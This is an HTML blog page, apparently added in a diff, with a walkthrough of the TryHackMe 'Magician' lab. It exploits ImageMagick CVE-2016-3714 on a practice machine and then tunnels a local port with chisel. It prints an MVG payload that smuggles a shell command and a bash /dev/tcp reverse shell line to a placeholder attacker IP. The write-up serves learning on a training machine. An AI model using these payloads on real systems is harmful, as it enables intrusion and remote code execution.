@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/logo.png">
+
+<title>Tryhackme Magician | Razor-Sec</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Tryhackme Magician | Razor-Sec</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Tryhackme Magician" />
+<meta name="author" content="Razor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room here" />
+<meta property="og:description" content="Introduction This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room here" />
+<meta property="og:site_name" content="Razor-Sec" />
+<meta property="og:image" content="/assets/thm_magician/bg.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-23T00:00:00-06:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/assets/thm_magician/bg.png" />
+<meta property="twitter:title" content="Tryhackme Magician" />
+<meta name="google-site-verification" content="an3WPRVUJk0x4PXH2PRpcD1vt1eBUdQhPLpgsNgamGQ" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Razor"},"headline":"Tryhackme Magician","dateModified":"2021-02-23T00:00:00-06:00","description":"Introduction This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room here","datePublished":"2021-02-23T00:00:00-06:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup-tryhackme-magician/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/logo.png"},"name":"Razor"},"url":"/writeup-tryhackme-magician/","image":"/assets/thm_magician/bg.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxxxx-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-xxxxxxxx-1');
+</script>
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/">Home</a></li>
+        <li><a href="/about">About</a></li>
+        <li><a href="/categories">Categories </a></li> 
+        <li><a href="/authors">Users </a></li>     
+        <li><a href="/contact">Contact</a></li>       
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/logo.png" alt="Razor-Sec">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Tryhackme Magician</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+        </div>            
+        <div>
+        Written by Razor-Admin on 
+        <span class="post-date"><time class="post-date" datetime="2021-02-23">23 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/thm_magician/bg.png" alt="Tryhackme Magician">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    
+    <div class="toc mt-4 mb-4 lead">
+        <h3 class="font-weight-bold">Summary</h3>
+        <ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#scanning">Scanning</a>
+    <ul>
+      <li><a href="#nmap">Nmap</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploit">Exploit</a>
+    <ul>
+      <li><a href="#getting-shell">Getting Shell</a></li>
+    </ul>
+  </li>
+  <li><a href="#flag-usertxt">Flag User.txt</a></li>
+  <li><a href="#flag-roottxt">Flag Root.txt</a></li>
+</ul>
+    </div>
+    
+    <!-- End Toc -->
+    <h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room <a href="https://tryhackme.com/room/magician">here</a></p>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<pre><code class="language-bash">$ nmap -sC -sV -oA nmap/nmap 10.10.74.239
+Nmap scan report for 10.10.74.239
+Host is up (0.37s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+8081/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: magician
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 23 17:27:16 2021 -- 1 IP address (1 host up) scanned in 37.43 seconds
+</code></pre>
+<p>We just have 2 port open like FTP and Webservice (nginx). now i want to try login ftp with anonymous login.</p>
+
+<p><img src="/assets/thm_magician/bg_1.png" alt="img" /></p>
+
+<p>As you can see we can’t let in but there is have some hint for us. I’m going to https://imagetragick.com which is POC of CVE-2016–3714. Now before going to web we must put host in /etc/hosts.</p>
+<pre><code class="language-bat">127.0.0.1       localhost
+127.0.1.1       Razor
+
+# CTF
+10.10.74.239 magician
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre>
+
+<p><img src="/assets/thm_magician/bg_2.png" alt="img" /></p>
+
+<p>I’m trying to using burpsuite and test POC from imagetragick which we found before.</p>
+
+<p><img src="/assets/thm_magician/bg_3.png" alt="img" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>then i’m try to following POC from imagetragick and checking with ping back to my ip using tcpdump <code>$ sudo tcpdump -i tun0 host magician and -n icmp</code>.</p>
+
+<pre><code class="language-bat">push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oos.jpg";ping -c5 10.2.47.251")'
+pop graphic-context
+</code></pre>
+
+<p><img src="/assets/thm_magician/bg_4.png" alt="img" /></p>
+
+<h3 id="getting-shell">Getting Shell</h3>
+
+<p>And its works. i got ping back from web, So we can create revershell with <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> then prepare for revershell with nc <code>nc -lvnp &lt;PORT&gt;</code></p>
+
+<p><img src="/assets/thm_magician/bg_5.png" alt="img" /></p>
+
+<p>Now i got shell, then let’s make it shell to real shell .</p>
+
+<p><img src="/assets/thm_magician/bg_6.png" alt="img" /></p>
+
+<h2 id="flag-usertxt">Flag User.txt</h2>
+
+<p>As you can see we got user magician and let’s take the flag :D</p>
+
+<pre><code class="language-bash">magician@magician:~$ cd /home/magician/
+magician@magician:~$ cat user.txt 
+THM{s----REDACTED----x}
+magician@magician:~$ 
+</code></pre>
+
+<p>There is have some files namely <code>the_magic_continues</code> , let’s take a look the file :</p>
+
+<p><img src="/assets/thm_magician/bg_7.png" alt="img" /></p>
+
+<p>There is give me some hint again then let’s take a look port on This machines <code>(netstat -punta || ss --ntpu) | grep "127"</code>.</p>
+
+<p><img src="/assets/thm_magician/bg_8.png" alt="img" /></p>
+
+<p>There are many methods we can use to tunnel the port. In this case I will use chisel and you can download that in <a href="https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz">here</a>, Then uploaded to machine.</p>
+
+<p><img src="/assets/thm_magician/bg_9.png" alt="img" /></p>
+
+<p>Now we can setup the Chisel :</p>
+<ul>
+  <li>First create server reverse port to tunneling port <code>./chisel server --reverse --port 4242</code>.
+<img src="/assets/thm_magician/bg_10.png" alt="img" /></li>
+  <li>Then create client on machines and setting R port to 6969 for access in web “localhost:6969” <code>./chisel client 10.2.47.251:4242 R:6969:localhost:6666</code>.
+<img src="/assets/thm_magician/bg_11.png" alt="img" /></li>
+</ul>
+
+<p>Now we done for setup tunneling localhost:6666 to localhost:6969(In My Machine). Now let’s take a look the browser</p>
+
+<p><img src="/assets/thm_magician/bg_12.png" alt="img" /></p>
+
+<p>Then just type <code>/root/root.txt</code></p>
+
+<p><img src="/assets/thm_magician/bg_13.png" alt="img" /></p>
+
+<h2 id="flag-roottxt">Flag Root.txt</h2>
+
+<p>There is a Binary and we can convert to ASCII</p>
+
+<p><img src="/assets/thm_magician/bg_14.png" alt="img" /></p>
+
+<p>Then we have flag for root not :D</p>
+
+<p>so that’s all the writeup that I made, now we have user flag and root flag.</p>
+
+<p>Happy hacking :D</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
+    <div class="row">
+        <div class="wrapavname col-md-3 text-center">
+            
+            <img  class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+            
+            <p class="mt-4 mb-0 small text-center">
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://www.wowthemes.net/donate/"><i class="fa fa-link"></i></a> 
+                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/0xRxd"><i class="fab fa-twitter"></i></a>
+                <a class="d-inline-block mx-1 text-dark" href="mailto:markoyanfyan12@gmail.com"><i class="fa fa-envelope"></i></a>
+            </p>
+        </div>
+        <div class="col-md-9">
+            <h4>Razor-Admin</h4>
+            <p class="mt-3 mb-0">Author of Razor-Sec, And i'm learner, Cyber Security Enthusias, DevOps, SysOps</p>
+        </div>
+    </div> 
+</div> 
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments mt-5">
+    <button class="btn btn-outline-dark py-2 px-5 d-block w-100 show-comments"><i class="fa fa-comments text-muted"></i> &nbsp; Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'Demo-RazorSec'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Tryhackme Magician&url=/writeup-tryhackme-magician/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/writeup-tryhackme-magician/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/writeup-tryhackme-magician/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Linux">Linux</a>                
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Tryhackme">Tryhackme</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#boot2root">boot2root</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#cve">cve</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#easy-box">easy-box</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#enumeration">enumeration</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#web-exploitation">web exploitation</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-hackerofthehill/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_hackerofthehill/bg.png" alt="Tryhackme hackerofthehill"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-hackerofthehill/">Tryhackme hackerofthehill</a>
+                
+                <div class="mb-2 mt-2 font-weight-normal">
+                <div class="rating-holder">
+<div class="c-rating c-rating--regular" data-rating-value="4.5">
+  <button>1</button>
+  <button>2</button>
+  <button>3</button>
+  <button>4</button>
+  <button>5</button>
+</div>
+</div>
+                </div>
+                
+            </h2>
+            <h4 class="card-text">Introduction This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">11 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-tryhackme-sustah/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/thm_sustah/bg.png" alt="Tryhackme sustah"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-tryhackme-sustah/">Tryhackme sustah</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">05 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/writeup-vulnhub-loly/">
+                
+
+                    
+                        <img class="img-thumb" src="/assets/vulnhub_loly/bg.png" alt="Loly Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/writeup-vulnhub-loly/">Loly Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Introduction
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="/assets/img/p.png" alt="Razor-Admin">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">02 Mar 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
